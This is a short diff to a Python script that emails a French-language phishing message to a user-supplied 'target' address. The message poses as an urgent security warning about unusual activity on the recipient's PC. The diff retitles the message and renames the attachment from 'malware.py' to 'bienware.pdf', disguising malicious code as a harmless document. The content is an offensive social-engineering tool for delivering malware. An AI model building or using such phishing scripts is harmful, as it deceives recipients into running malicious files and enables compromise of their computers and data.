@@ -44,7 +44,7 @@ body = """
 </head>
 <body>
     <div class="container">
-        <h2>Urgent - Mise à jour requise sur votre compte</h2>
+        <h2>Urgent - Mise à jour requise sur votre PC</h2>
         <p>Bonjour</p>
         <p>
             Nous avons détecté une activité inhabituelle sur votre ordinateur et avons temporairement suspendu certains programmes pour raisons de sécurité. 
@@ -64,4 +64,4 @@ body = """
 """
 
 email_cible = input("Entrez l'email de la cible : ")
-envoyer_mail(email_cible, "Urgent - Mise à jour requise sur votre compte", body, "malware.py")
+envoyer_mail(email_cible, "Urgent - Mise à jour requise sur votre compte", body, "bienware.pdf")
